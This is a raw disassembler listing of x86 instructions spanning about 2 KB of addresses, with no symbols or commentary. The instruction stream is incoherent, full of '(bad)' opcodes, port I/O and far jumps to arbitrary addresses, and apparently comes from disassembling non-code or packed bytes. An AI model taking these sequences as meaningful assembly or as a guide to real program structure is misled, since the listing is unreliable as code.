  4200e6:	cmp    bl,BYTE PTR [esi+0x59a04bc5]
  4200ec:	dec    ebp
  4200ed:	xor    DWORD PTR [eax+0x63],edi
  4200f0:	aaa    
  4200f1:	mov    eax,DWORD PTR [esi]
  4200f3:	push   edi
  4200f4:	xchg   ebx,eax
  4200f5:	adc    al,0xb9
  4200f7:	jns    0x42016c
  4200f9:	mov    cl,0x18
  4200fb:	inc    edi
  4200fc:	ins    DWORD PTR es:[edi],dx
  4200fd:	mov    cl,0x4
  4200ff:	rcr    bh,0xe9
  420102:	popa   
  420103:	fisub  WORD PTR [ebx-0x282dca8b]
  420109:	js     0x4200d5
  42010b:	adc    ebx,DWORD PTR [edx-0x364d73fe]
  420111:	fld    TBYTE PTR [edx+ebx*4]
  420114:	dec    ebx
  420115:	jae    0x4200f6
  420117:	mov    ch,0x52
  420119:	push   cs
  42011a:	mov    bl,0x5
  42011c:	std    
  42011d:	xchg   ecx,eax
  42011e:	add    esi,DWORD PTR [esi+0x6098d286]
  420124:	je     0x420177
  420126:	push   0x4e
  420128:	xor    DWORD PTR [ecx+0x32],edi
  42012b:	add    DWORD PTR [ecx],ebx
  42012d:	inc    BYTE PTR [esi-0x73fc3601]
  420133:	ret    0x3363
  420136:	(bad)  [edx]
  420138:	push   ss
  420139:	jmp    0x71c58b3a
  42013e:	inc    eax
  42013f:	mov    eax,0x80e54172
  420144:	daa    
  420145:	mov    ecx,0xe0e2ff6f
  42014a:	mov    esp,0xb390c341
  42014f:	fdivr  st,st(0)
  420151:	mov    dl,0x7b
  420153:	mov    al,ds:0x839bcca3
  420158:	adc    DWORD PTR [ebp+0x40],eax
  42015b:	shl    BYTE PTR [ebp-0x487787f8],1
  420161:	aas    
  420162:	js     0x420145
  420164:	(bad)
  420168:	pop    ebx
  420169:	retf   
  42016a:	in     al,0x92
  42016c:	or     edx,eax
  42016e:	adc    al,0x5a
  420170:	adc    al,0x39
  420172:	adc    al,0xa2
  420174:	add    BYTE PTR [ebx],ch
  420176:	adc    al,ah
  420178:	test   DWORD PTR [ebp+ecx*8-0x8fd9efc],ecx
  42017f:	icebp  
  420180:	adc    esi,edi
  420182:	dec    ebx
  420183:	push   0xb1e813
	...
  420190:	add    BYTE PTR [edx+ecx*1-0x6060f363],dl
  420197:	xchg   ebp,eax
  420198:	call   0x61e:0x7836e732
  42019f:	sub    BYTE PTR [edi+0x17c11],0xae
  4201a6:	add    eax,DWORD PTR [eax]
  4201a8:	add    dl,cl
  4201aa:	push   es
  4201ab:	fld    DWORD PTR [edx]
  4201ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4201ae:	loop   0x4201a4
  4201b0:	xlat   BYTE PTR ds:[ebx]
  4201b1:	inc    ecx
  4201b2:	push   0xdd08f0d1
  4201b7:	jg     0x42019b
  4201b9:	adc    al,0x9a
  4201bb:	push   ss
  4201bc:	(bad)  
  4201bd:	in     al,dx
  4201be:	and    BYTE PTR [ecx+ebx*1-0x55510278],al
  4201c5:	xchg   edx,eax
  4201c6:	jle    0x420237
  4201c8:	mov    ah,al
  4201ca:	or     eax,0xa9d5a0b2
  4201cf:	mov    al,ds:0xe6f7fa4e
  4201d4:	push   0xc0ed1167
  4201d9:	pushf  
  4201da:	fimul  DWORD PTR [ebp+eiz*1-0x51fad64a]
  4201e1:	jo     0x420208
  4201e3:	pop    esi
  4201e4:	jecxz  0x42025c
  4201e6:	test   al,0x39
  4201e8:	call   0x8ecf47c6
  4201ed:	sbb    cl,BYTE PTR [esp+ecx*4-0x7]
  4201f1:	bound  edx,QWORD PTR [edi+0x62]
  4201f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4201f5:	push   0xeb3ea747
  4201fa:	iret   
  4201fb:	xor    BYTE PTR [eax+0x789f6eca],dl
  420201:	mov    dh,0xdd
  420203:	pop    ebx
  420204:	call   0xc3af9059
  420209:	jne    0x420218
  42020b:	jns    0x42026c
  42020d:	mov    ds:0x3af67764,al
  420212:	scas   al,BYTE PTR es:[edi]
  420213:	lds    ecx,FWORD PTR [ecx]
  420215:	xor    edx,DWORD PTR [edx-0x3519a689]
  42021b:	gs mov ah,0x10
  42021e:	out    0xa0,eax
  420220:	and    bl,ch
  420222:	(bad)  
  420223:	jp     0x4201e6
  420225:	pusha  
  420226:	sub    eax,0xf4a78bb2
  42022b:	icebp  
  42022c:	pushf  
  42022d:	mov    ecx,0x6f89d848
  420232:	pop    ebp
  420233:	or     al,0xce
  420235:	and    al,0x81
  420237:	mov    WORD PTR [ecx-0x71],ss
  42023a:	inc    ebx
  42023b:	push   eax
  42023c:	into   
  42023d:	lods   eax,DWORD PTR ds:[esi]
  42023e:	cs push edi
  420240:	adc    al,0xaa
  420242:	ret    0x2469
  420245:	es daa 
  420247:	js     0x420227
  420249:	bswap  ecx
  42024b:	daa    
  42024c:	xor    al,0x90
  42024e:	jge    0x4202bb
  420250:	xlat   BYTE PTR ds:[ebx]
  420251:	cdq    
  420252:	scas   al,BYTE PTR es:[edi]
  420253:	in     al,dx
  420254:	cld    
  420255:	lea    esi,[eax]
  420257:	scas   eax,DWORD PTR es:[edi]
  420258:	xchg   ebp,eax
  420259:	jno    0x42022e
  42025b:	out    0x57,eax
  42025d:	lahf   
  42025e:	fstp   DWORD PTR [eax+0x7989db3e]
  420264:	adc    dh,BYTE PTR [ecx+0x21]
  420267:	adc    BYTE PTR [esi+0x21],cl
  42026a:	repz inc esp
  42026c:	pop    esi
  42026d:	fldcw  WORD PTR [eax-0x5d]
  420270:	add    DWORD PTR [edx+0x19],esi
  420273:	pop    edi
  420274:	sbb    cl,BYTE PTR [edi+ebx*2+0x62]
  420278:	outs   dx,BYTE PTR ds:[esi]
  420279:	repz mov ch,0xaa
  42027c:	dec    eax
  42027d:	aas    
  42027e:	rol    edi,cl
  420280:	scas   eax,DWORD PTR es:[edi]
  420281:	xchg   ebp,eax
  420282:	adc    ah,BYTE PTR [ecx]
  420284:	repnz cmp DWORD PTR [ebx+0x4b8803fd],edi
  42028b:	clc    
  42028c:	hlt    
  42028d:	mov    dl,0x7a
  42028f:	ror    BYTE PTR [esi],0x54
  420292:	cmc    
  420293:	shl    DWORD PTR [eax+0x34468068],1
  420299:	mov    dl,0xc5
  42029b:	popf   
  42029c:	pop    edx
  42029d:	faddp  st(7),st
  42029f:	cli    
  4202a0:	fstp   DWORD PTR [ebp+ebp*2-0x3c]
  4202a4:	aam    0xf
  4202a6:	imul   ebx,DWORD PTR [eax+0x63],0x67
  4202aa:	daa    
  4202ab:	push   ss
  4202ac:	imul   ebp,DWORD PTR [esi+0x2a13ce4d],0x9e7ab908
  4202b6:	dec    DWORD PTR [esi-0x72]
  4202b9:	imul   DWORD PTR [edi-0x1c41adf1]
  4202bf:	push   es
  4202c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4202c1:	pop    ecx
  4202c2:	xchg   esi,eax
  4202c3:	lods   eax,DWORD PTR ds:[esi]
  4202c4:	data16 aas 
  4202c6:	push   edx
  4202c7:	das    
  4202c8:	pop    ds
  4202c9:	mov    ah,0x3d
  4202cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4202cc:	(bad)  
  4202cd:	ss addr16 and al,0x7b
  4202d1:	es pusha 
  4202d3:	and    cl,bh
  4202d5:	xlat   BYTE PTR ds:[ebx]
  4202d6:	xor    al,0xd0
  4202d8:	jmp    0x225de9c1
  4202dd:	call   0x174eca07
  4202e2:	jnp    0x42030d
  4202e4:	icebp  
  4202e5:	jbe    0x420315
  4202e7:	push   cs
  4202e8:	es jl  0x420350
  4202eb:	out    dx,al
  4202ec:	pop    ebp
  4202ed:	jp     0x42031e
  4202ef:	inc    ebp
  4202f0:	jno    0x420331
  4202f2:	ja     0x42032c
  4202f4:	pop    edi
  4202f5:	test   al,0x29
  4202f7:	adc    al,0xed
  4202f9:	jmp    0x3ff3:0x66956cca
  420300:	fstp   TBYTE PTR [ebx+esi*1-0xa]
  420304:	(bad)  
  420305:	sbb    eax,0xf5caf188
  42030a:	lods   eax,DWORD PTR ds:[esi]
  42030b:	xchg   ebx,ebx
  42030d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42030e:	mov    cl,0x22
  420310:	loope  0x42037b
  420312:	jae    0x420382
  420314:	imul   edx,DWORD PTR [esi+0x2],0x68
  420318:	in     eax,dx
  420319:	adc    eax,0xd11aeae8
  42031e:	mov    al,ds:0xd64e3611
  420323:	rol    DWORD PTR [esi],cl
  420325:	jo     0x420384
  420327:	call   0x94b16f69
  42032c:	inc    ebx
  42032d:	xor    eax,0xe8706fdb
  420332:	cmp    eax,0xa937dcba
  420337:	mov    dh,0xf8
  420339:	mov    al,0x66
  42033b:	test   DWORD PTR cs:[esi],esp
  42033e:	push   ds
  42033f:	ror    BYTE PTR [eax+0x72],cl
  420342:	mov    dl,0x6e
  420344:	scas   eax,DWORD PTR es:[edi]
  420345:	push   ecx
  420346:	jne    0x42039e
  420348:	fiadd  WORD PTR [edi-0xb403956]
  42034e:	mov    al,0x96
  420350:	scas   eax,DWORD PTR es:[edi]
  420351:	jmp    0x42031c
  420353:	in     eax,dx
  420354:	repz or ebp,DWORD PTR [ebp+0x47be683e]
  42035b:	daa    
  42035c:	stos   DWORD PTR es:[edi],eax
  42035d:	ret    
  42035e:	jmp    0x420391
  420360:	fadd   QWORD PTR [edi]
  420362:	cli    
  420363:	pop    esp
  420364:	xchg   ebx,eax
  420365:	xlat   BYTE PTR ds:[ebx]
  420366:	fistp  DWORD PTR [ebp+0x63]
  420369:	lahf   
  42036a:	lahf   
  42036b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42036c:	inc    eax
  42036d:	rcl    BYTE PTR [esi+0x17],0xf5
  420371:	fwait
  420372:	mov    edi,0xb8546c44
  420377:	lahf   
  420378:	jo     0x420363
  42037a:	inc    eax
  42037b:	gs aaa 
  42037d:	retf   0x163a
  420380:	sub    BYTE PTR [edx-0x65d2b63d],ah
  420386:	mov    ebp,0xb94e63d9
  42038b:	pop    edi
  42038c:	push   ebx
  42038d:	sbb    al,0x56
  42038f:	sbb    dl,dh
  420391:	xlat   BYTE PTR ds:[ebx]
  420392:	mov    esp,0x57e3988a
  420397:	lods   eax,DWORD PTR ds:[esi]
  420398:	jo     0x420396
  42039a:	call   0x2f8d:0xf07c9044
  4203a1:	into   
  4203a2:	clc    
  4203a3:	jae    0x4203b6
  4203a5:	ret    0xa969
  4203a8:	out    0x41,al
  4203aa:	mov    edx,0x457969d7
  4203af:	in     eax,dx
  4203b0:	call   0xd58a:0x744f39b1
  4203b7:	(bad)  
  4203b8:	fcmove st,st(1)
  4203ba:	inc    bh
  4203bc:	lock sbb BYTE PTR [eax-0x74],dl
  4203c0:	sub    esp,DWORD PTR [esp+ebx*2+0x6731bd6b]
  4203c7:	cwde   
  4203c8:	pop    esp
  4203c9:	sahf   
  4203ca:	test   DWORD PTR [ebp+0x2108edfc],edx
  4203d0:	int    0xfc
  4203d2:	mov    WORD PTR ds:[ebp+0x8],ss
  4203d6:	pop    edx
  4203d7:	xchg   edi,eax
  4203d8:	shl    ecx,0xfc
  4203db:	in     eax,dx
  4203dc:	fistp  DWORD PTR [ebp+0x16c48c1]
  4203e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4203e3:	arpl   WORD PTR [ecx-0x745c3d77],bp
  4203e9:	pop    ebp
  4203ea:	mov    ecx,0xc98f24f7
  4203ef:	aas    
  4203f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4203f1:	inc    ebp
  4203f2:	sbb    DWORD PTR ds:0xeb9a625c,ebx
  4203f8:	push   0x1bba1f5f
  4203fd:	inc    eax
  4203fe:	cdq    
  4203ff:	lds    ebx,FWORD PTR [edx-0x23a68176]
  420405:	int    0x6e
  420407:	add    al,0xf6
  420409:	jb     0x42042d
  42040b:	pop    esi
  42040c:	push   esi
  42040d:	ret    0x63c2
  420410:	and    al,0xa6
  420412:	adc    al,0x88
  420414:	pop    ebp
  420415:	inc    ebx
  420416:	data16 sar ch,1
  420419:	or     al,0x4d
  42041b:	xchg   ecx,eax
  42041c:	inc    ebx
  42041d:	ja     0x4203d3
  42041f:	mov    eax,ebx
  420421:	leave  
  420422:	xor    BYTE PTR [ebp+0x7442c9c2],0x80
  420429:	sbb    DWORD PTR [ebx-0x603adb6d],0x75
  420430:	adc    bh,BYTE PTR [ecx]
  420432:	add    eax,0xaf774437
  420437:	adc    BYTE PTR [edi],cl
  420439:	jb     0x4203be
  42043b:	stc    
  42043c:	ins    DWORD PTR es:[edi],dx
  42043d:	repz in eax,dx
  42043f:	rol    BYTE PTR [edx-0x4dfa8019],1
  420445:	js     0x420412
  420447:	mov    BYTE PTR [ebx],bh
  420449:	adc    ebp,DWORD PTR [esi]
  42044b:	test   eax,0x7ffb85bc
  420450:	mov    ebp,0x8ddfb0d0
  420455:	mov    eax,0x3d28b76c
  42045a:	test   DWORD PTR [edi-0x22d9d1c4],0x5d51bbc1
  420464:	mov    cl,BYTE PTR [ecx]
  420466:	dec    edx
  420467:	pop    edi
  420468:	dec    ebx
  420469:	pop    ebx
  42046a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42046b:	outs   dx,BYTE PTR es:[esi]
  42046d:	mov    edx,0xf7682c71
  420472:	cmp    ebx,DWORD PTR [bp+di]
  420475:	add    BYTE PTR [ecx+0x3ea73785],bh
  42047b:	sbb    BYTE PTR [edi+edi*1-0x687295f0],0x64
  420483:	or     ebp,DWORD PTR [esi]
  420485:	je     0x42040f
  420487:	les    ecx,FWORD PTR gs:[ecx]
  42048a:	pop    esi
  42048b:	scas   al,BYTE PTR es:[edi]
  42048c:	test   eax,0xbd0415bf
  420491:	jno    0x42048f
  420493:	test   al,0x6c
  420495:	retf   0x1171
  420498:	pusha  
  420499:	cmp    ah,cl
  42049b:	int    0x4c
  42049d:	xchg   esi,eax
  42049e:	cmp    dh,BYTE PTR [edi-0x1b]
  4204a1:	dec    edx
  4204a2:	inc    esp
  4204a3:	sbb    ebp,DWORD PTR [ebp+0x68]
  4204a6:	jp     0x42049e
  4204a8:	sbb    al,0x7a
  4204aa:	fistp  WORD PTR [ebx-0x41e02e17]
  4204b0:	xlat   BYTE PTR ds:[ebx]
  4204b1:	xlat   BYTE PTR ds:[ebx]
  4204b2:	aas    
  4204b3:	pop    ss
  4204b4:	or     DWORD PTR fs:[edx],esp
  4204b7:	pop    es
  4204b8:	dec    eax
  4204b9:	sub    ecx,DWORD PTR [ebx]
  4204bb:	pop    eax
  4204bc:	(bad)  
  4204bd:	jecxz  0x4204d8
  4204bf:	retf   0x3d7f
  4204c2:	lahf   
  4204c3:	(bad)  
  4204c4:	in     al,0xce
  4204c6:	loope  0x42052d
  4204c8:	push   es
  4204c9:	sbb    BYTE PTR [ebp-0x54],bl
  4204cc:	(bad)  [esi-0x63ac0a55]
  4204d2:	mov    ah,0xb
  4204d4:	or     bh,BYTE PTR [edx]
  4204d6:	pop    eax
  4204d7:	enter  0x437d,0x54
  4204db:	sub    BYTE PTR [ebx],dh
  4204dd:	retf   
  4204de:	adc    DWORD PTR [ecx-0xe],edi
  4204e1:	pop    ds
  4204e2:	add    BYTE PTR ds:0xac7c2aa1,bl
  4204e8:	jne    0x4204b7
  4204ea:	push   ecx
  4204eb:	mov    eax,0xd29603ed
  4204f0:	out    dx,eax
  4204f1:	mov    ds:0xab30ec9c,al
  4204f6:	int    0x86
  4204f8:	leave  
  4204f9:	jmp    0x420489
  4204fb:	mov    ebp,DWORD PTR [ecx+0x9]
  4204fe:	loope  0x420506
  420500:	repnz push ebp
  420502:	mov    WORD PTR [ecx+ecx*2+0x17],?
  420506:	pminub mm7,QWORD PTR cs:[ecx-0x5c]
  42050b:	and    ah,BYTE PTR [ebx]
  42050d:	jle    0x420506
  42050f:	test   al,0x90
  420511:	mov    al,0x9f
  420513:	or     cl,BYTE PTR [ebx-0x75d43c5d]
  420519:	imul   eax,DWORD PTR [edi-0x248f6f05],0x9
  420520:	inc    ecx
  420521:	sbb    cl,al
  420523:	cmp    DWORD PTR [edi-0x5c623f8c],ebp
  420529:	xchg   ecx,eax
  42052a:	test   BYTE PTR [edx],0xa4
  42052d:	or     cl,0x77
  420530:	outs   dx,DWORD PTR ds:[esi]
  420531:	pop    edi
  420532:	popa   
  420533:	lds    ebp,FWORD PTR [ebx-0x14]
  420536:	shr    BYTE PTR [eax-0x63c92cbb],1
  42053c:	jae    0x420556
  42053e:	push   eax
  42053f:	add    al,BYTE PTR cs:[edi]
  420542:	xor    bl,BYTE PTR [edi]
  420544:	mov    edx,0xb545df88
  420549:	in     eax,dx
  42054a:	push   es
  42054b:	pop    es
  42054c:	int    0x9e
  42054e:	cld    
  42054f:	cld    
  420550:	cmp    edx,ebx
  420552:	push   esp
  420553:	cmp    DWORD PTR [ebx+ebx*2],ecx
  420556:	call   0x0:0x0
  42055d:	add    BYTE PTR [eax],al
  42055f:	add    BYTE PTR [eax],al
  420561:	nop
  420562:	mov    bl,0x8c
  420564:	fild   QWORD PTR [edi-0x1b002c01]
  42056a:	and    dh,0xd4
  42056d:	lods   eax,DWORD PTR ds:[esi]
  42056e:	dec    esi
  42056f:	pause  
  420571:	mov    edi,0xae00017f
  420576:	add    eax,DWORD PTR [eax]
  420578:	add    BYTE PTR [edi+0x6bcf930f],al
  42057e:	call   0x695e:0xa5fa605f
  420585:	in     al,dx
  420586:	add    eax,0x2b7d2508
  42058b:	cdq    
  42058c:	mov    edx,0xf1972fe1
  420591:	jns    0x42056e
  420593:	ret    0x76e9
  420596:	das    
  420597:	jae    0x420526
  420599:	inc    esp
  42059a:	psrlq  mm3,QWORD PTR [ebx-0x44a13324]
  4205a1:	lds    eax,FWORD PTR [ebx*8+0x4109d38c]
  4205a8:	cmp    DWORD PTR [edi+edi*4-0x51],edx
  4205ac:	and    esi,DWORD PTR [ebx-0x2a339cbc]
  4205b2:	inc    BYTE PTR [edx-0x69]
  4205b5:	jge    0x4205d4
  4205b7:	mov    ecx,ecx
  4205b9:	or     DWORD PTR [esi+0x539014af],0x6d3812ad
  4205c3:	dec    edi
  4205c4:	repz ret 
  4205c6:	out    dx,al
  4205c7:	lods   al,BYTE PTR ds:[esi]
  4205c8:	xchg   esi,eax
  4205c9:	push   ecx
  4205ca:	cmp    BYTE PTR [ebp-0x78],ah
  4205cd:	and    al,0x41
  4205cf:	mov    ebx,0xc648a952
  4205d4:	in     al,dx
  4205d5:	ja     0x420601
  4205d7:	push   ss
  4205d8:	jb     0x4205a9
  4205da:	test   al,0x11
  4205dc:	jecxz  0x420580
  4205de:	fsubr  DWORD PTR [edi+0x28]
  4205e1:	cli    
  4205e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4205e3:	jg     0x42056e
  4205e5:	outs   dx,DWORD PTR ds:[esi]
  4205e6:	test   eax,0xdc718d70
  4205eb:	shl    BYTE PTR [edi-0x4d],cl
  4205ee:	js     0x420664
  4205f0:	mov    cl,0xca
  4205f2:	inc    edx
  4205f3:	mov    ebp,ds
  4205f5:	cs mov eax,0x33214db7
  4205fb:	push   esp
  4205fc:	mov    DWORD PTR [eax+0x78],ebp
  4205ff:	push   esi
  420600:	fstp   QWORD PTR [ebx-0x6b]
  420603:	scas   eax,DWORD PTR es:[edi]
  420604:	bound  esp,QWORD PTR [ecx-0x39fa531a]
  42060a:	pop    esi
  42060b:	mov    eax,ds:0xe9ff0736
  420610:	mov    al,0xfa
  420612:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420613:	dec    edi
  420614:	xchg   esp,eax
  420615:	mov    eax,ds:0xa72c397e
  42061a:	inc    ebp
  42061b:	mov    edx,0xff075f12
  420620:	arpl   WORD PTR [edi+0x213f17a5],sp
  420626:	lds    ecx,FWORD PTR [esi+0x44]
  420629:	leave  
  42062a:	mov    ds:0x48594d41,eax
  42062f:	mov    edi,0xb4853da3
  420634:	add    dl,BYTE PTR [ecx+0x7a]
  420637:	cdq    
  420638:	out    0x4f,eax
  42063a:	mov    bh,0x95
  42063c:	stos   DWORD PTR es:[edi],eax
  42063d:	jbe    0x42060e
  42063f:	mov    cl,0x9e
  420641:	mul    DWORD PTR [ecx+0x25]
  420644:	jecxz  0x4205c7
  420646:	aaa    
  420647:	sbb    eax,edx
  420649:	cmp    bl,BYTE PTR [ebx-0x7cc55269]
  42064f:	mov    bl,cl
  420651:	loop   0x42064b
  420653:	inc    ebp
  420654:	inc    ecx
  420655:	sub    eax,0x6dfd6beb
  42065a:	repnz std 
  42065c:	push   ds
  42065d:	ss iret 
  42065f:	mov    ss,WORD PTR [ebx]
  420661:	or     dh,BYTE PTR [ebx+0x76]
  420664:	mov    bl,0xa7
  420666:	loopne 0x42069e
  420668:	jae    0x42068d
  42066a:	and    eax,0xfca28f4c
  42066f:	pop    ss
  420670:	mov    edx,0x5f2b62d2
  420675:	jo     0x42066d
  420677:	pusha  
  420678:	test   BYTE PTR [edx-0x7a4e4668],cl
  42067e:	iret   
  42067f:	mov    bl,0x19
  420681:	outs   dx,DWORD PTR ds:[esi]
  420682:	test   eax,0x642e040b
  420687:	jne    0x42068b
  420689:	arpl   WORD PTR [edx-0x72c069e5],sp
  42068f:	push   ecx
  420690:	pop    esi
  420691:	sub    bh,BYTE PTR [eax]
  420693:	fwait
  420694:	sub    eax,0x2aab0292
  420699:	push   0x29
  42069b:	xor    al,0xd0
  42069d:	add    ebx,DWORD PTR ds:0x7fb5ad04
  4206a3:	ins    DWORD PTR es:[edi],dx
  4206a4:	jnp    0x42064c
  4206a6:	cmc    
  4206a7:	sub    BYTE PTR [edi],ch
  4206a9:	lahf   
  4206aa:	mov    ch,0xfa
  4206ac:	adc    bh,BYTE PTR [edx+0x2356667b]
  4206b2:	or     eax,0x3637d9e9
  4206b7:	loop   0x4206b5
  4206b9:	push   esi
  4206ba:	cs inc eax
  4206bc:	add    al,0xe4
  4206be:	mov    eax,0x68765466
  4206c3:	mov    al,0xb6
  4206c5:	pop    es
  4206c6:	add    eax,0x296330ad
  4206cb:	test   BYTE PTR [edx],dh
  4206cd:	and    ebp,DWORD PTR [edi+0x1fd85702]
  4206d3:	out    dx,al
  4206d4:	jecxz  0x4206b1
  4206d6:	jno    0x420728
  4206d8:	jecxz  0x420717
  4206da:	and    eax,DWORD PTR [ebx]
  4206dc:	push   edx
  4206dd:	add    bl,ch
  4206df:	xor    cl,cl
  4206e1:	mov    BYTE PTR ds:[ebx-0x23714961],dh
  4206e8:	int3   
  4206e9:	lock jp 0x420737
  4206ec:	and    esp,ebp
  4206ee:	mov    esp,0x7fe6a4a2
  4206f3:	fwait
  4206f4:	and    bl,BYTE PTR [edx-0x56]
  4206f7:	les    edx,FWORD PTR [ebx]
  4206f9:	cmc    
  4206fa:	xchg   edi,eax
  4206fb:	rol    DWORD PTR [bp+di],1
  4206fe:	jl     0x420731
  420700:	sub    DWORD PTR [ebx+0x7e],ebp
  420703:	or     DWORD PTR [esp+ecx*8+0x5369d99b],esp
  42070a:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42070c:	js     0x4206ba
  42070e:	les    esi,FWORD PTR [edx+0x7a04367b]
  420714:	push   eax
  420715:	sub    al,0x8b
  420717:	jne    0x42071a
  420719:	fsubr  DWORD PTR [eax]
  42071b:	jl     0x420741
  42071d:	mov    ebp,edi
  42071f:	push   edi
  420720:	hlt    
  420721:	clc    
  420722:	inc    esp
  420723:	pop    es
  420724:	sahf   
  420725:	mov    eax,ds:0xa978950c
  42072a:	inc    esi
  42072b:	dec    eax
  42072c:	sub    ah,BYTE PTR [ebx]
  42072e:	in     eax,0x12
  420730:	test   DWORD PTR [ecx],edx
  420732:	lea    ebp,[esi-0x12]
  420735:	and    DWORD PTR [edi-0x7f],esi
  420738:	xor    DWORD PTR [eax+0xa],ebp
  42073b:	shl    DWORD PTR ss:[ebx],cl
  42073e:	mov    BYTE PTR [esi+0x6145f8fa],ah
  420744:	cmp    bh,ah
  420746:	dec    eax
  420747:	mov    eax,cs
  420749:	push   edx
  42074a:	adc    DWORD PTR [bx+si],esp
  42074d:	xor    ch,BYTE PTR [ecx+0xd11bd10]
  420753:	sub    al,BYTE PTR ds:0x33ce2c55
  420759:	(bad)  
  42075a:	stc    
  42075b:	int    0xfe
  42075d:	dec    esp
  42075e:	ds in  eax,dx
  420760:	out    dx,eax
  420761:	mov    edi,0xfc06b735
  420766:	shr    BYTE PTR [esi+0x76cb40be],0x7f
  42076d:	xchg   ecx,eax
  42076e:	jmp    0x4207ec
  420770:	inc    ebx
  420771:	jne    0x420782
  420773:	sub    DWORD PTR [ebx-0x2bb11cab],ebp
  420779:	sar    DWORD PTR [ebp+0x20],1
  42077c:	aad    0x8e
  42077e:	xor    ebx,DWORD PTR [ebp-0x7b07622c]
  420784:	mov    eax,0x5f806efa
  420789:	jmp    0x4e772bd5
  42078e:	or     esp,DWORD PTR [eax-0x18]
  420791:	test   eax,0xb1c8f2b2
  420796:	test   al,0x46
  420798:	and    DWORD PTR [eax-0x58],esp
  42079b:	xor    al,0x1e
  42079d:	(bad)  
  42079f:	ret    
  4207a0:	imul   edi,DWORD PTR [esi],0xffffff88
  4207a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4207a4:	cmovne edx,DWORD PTR [esi+0x23c3772d]
  4207ab:	mov    dh,0xd2
  4207ad:	add    esi,DWORD PTR [ebx+0x43fee486]
  4207b3:	into   
  4207b4:	jnp    0x420741
  4207b6:	and    al,0xef
  4207b8:	and    eax,0xca5d0926
  4207bd:	inc    ecx
  4207be:	(bad)  
  4207bf:	rep ins BYTE PTR es:[edi],dx
  4207c1:	(bad)  
  4207c2:	fadd   QWORD PTR [eax+eiz*2]
  4207c5:	mov    bl,BYTE PTR [edx]
  4207c7:	vpsraw ymm5,ymm2,XMMWORD PTR [eax+0x37]
  4207cc:	xor    dl,BYTE PTR ds:0x8131aa0d
  4207d2:	jno    0x420845
  4207d4:	xchg   ebx,eax
  4207d5:	sbb    bh,BYTE PTR [edi-0x70]
  4207d8:	mov    es,WORD PTR [edx-0x1a191590]
  4207de:	xor    ch,bh
  4207e0:	(bad)  
  4207e1:	sbb    eax,0x46e1111
  4207e6:	push   esp
  4207e7:	xlat   BYTE PTR ds:[ebx]
  4207e8:	aas    
  4207e9:	data16 hlt 
  4207eb:	in     eax,dx
  4207ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4207ed:	inc    eax
  4207ee:	xchg   esp,eax
  4207ef:	pushf  
  4207f0:	xchg   BYTE PTR [edx],ch
  4207f2:	sub    al,0xaf
  4207f4:	jp     0x42079b
  4207f6:	je     0x420787
  4207f8:	imul   ebx,ecx,0xfffffff3
  4207fb:	lock mov ecx,ds
  4207fe:	or     dl,BYTE PTR ds:0x91d6837a
  420804:	bound  ecx,QWORD PTR [eax]
  420806:	cmp    BYTE PTR [edi],cl
  420808:	cmp    ah,al
  42080a:	mov    dh,0x15
  42080c:	lds    ebp,FWORD PTR [edi+eax*2-0x9]
  420810:	push   eax
  420811:	xor    bl,ah
  420813:	dec    ecx
  420814:	in     eax,0x3a
  420816:	(bad)
  420819:	xor    al,0x36
  42081b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42081c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42081d:	add    ch,dh
  42081f:	js     0x420866
  420821:	fwait
  420822:	out    0xd4,eax
  420824:	mov    al,0x69
  420826:	mov    al,ds:0x9ac23708
  42082b:	mov    ch,0xdf
  42082d:	call   0x99dabca6
  420832:	test   eax,0x4bbd38e7
  420837:	sub    eax,DWORD PTR [ebx-0x359ba6db]
  42083d:	xor    DWORD PTR [esi-0x68],edx
  420840:	repnz push esp
  420842:	(bad)  
  420844:	mov    ax,0xc0c4
  420848:	int    0x80
  42084a:	mov    ch,0x37
  42084c:	push   0x75
  42084e:	jbe    0x4207e4
  420850:	cmp    BYTE PTR [esi+0x324dd7b4],dh
  420856:	mov    cl,0x11
  420858:	fstp   QWORD PTR [eax-0x23]
  42085b:	jle    0x420878
  42085d:	outs   dx,BYTE PTR ds:[esi]
  42085e:	sar    ch,cl
  420860:	mov    dh,ch
  420862:	inc    eax
  420863:	ret    0x6349
  420866:	add    dl,BYTE PTR [eax+0x44c84924]
  42086c:	xchg   edx,eax
  42086d:	mov    ebp,0x8a5ad171
  420872:	pop    ds
  420873:	lods   al,BYTE PTR ds:[esi]
  420874:	mov    bh,0xc2
  420876:	cmp    al,0xa3
  420878:	test   eax,0xb139caa6
  42087d:	xchg   ecx,eax
  42087e:	jecxz  0x42081f
  420880:	push   ebp
  420881:	(bad)  
  420882:	and    edx,DWORD PTR [esi-0x17757394]
  420888:	jge    0x42084e
  42088a:	jl     0x420868
  42088c:	or     ch,BYTE PTR [eax-0xf]
  42088f:	or     eax,esp
  420891:	out    dx,eax
  420892:	dec    esp
  420893:	dec    ebp
  420894:	xchg   ebx,eax
  420895:	adc    eax,0x55ced691
  42089a:	out    dx,al
  42089b:	or     DWORD PTR [ecx],ecx
  42089d:	pop    ebx
  42089e:	xchg   ecx,eax
  42089f:	cmp    ecx,DWORD PTR [edi+0x2c57e8c7]
  4208a5:	jmp    0x420833
  4208a7:	xor    dh,BYTE PTR [esi+eax*1+0x5001bf84]
  4208ae:	pop    ebx
  4208af:	mov    edi,0xe354c5b5
  4208b4:	adc    eax,0x9d90b1c3
  4208b9:	mov    ds:0x685747e3,al
  4208be:	mov    ah,0x9d
  4208c0:	mov    ds:0xed1011d3,al
  4208c5:	out    0x84,eax
  4208c7:	ficomp WORD PTR [ecx+0x65eb4bb6]
  4208cd:	mov    ecx,0xe9b36535
